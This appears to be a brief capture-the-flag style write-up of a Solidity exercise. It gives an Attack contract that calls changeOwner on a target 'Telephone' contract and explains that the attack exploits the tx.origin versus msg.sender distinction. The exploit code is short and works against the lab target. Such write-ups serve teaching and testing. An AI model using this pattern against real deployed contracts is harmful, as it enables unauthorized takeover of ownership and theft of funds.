Run the `attack()` function in `Attack.sol` which changes the owner to the `Attack.sol` smart contract.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract Attack{
  function attack(address _telephoneAddr) public {
    ITelephone(_telephoneAddr).changeOwner(msg.sender);
  }
}
```

It works on the principle that `tx.origin` is not same as `msg.sender` .The `tx.origin` is the initial Externally owned account which creates the original transaction whereas `msg.sender` could be a smart contract or EOA.
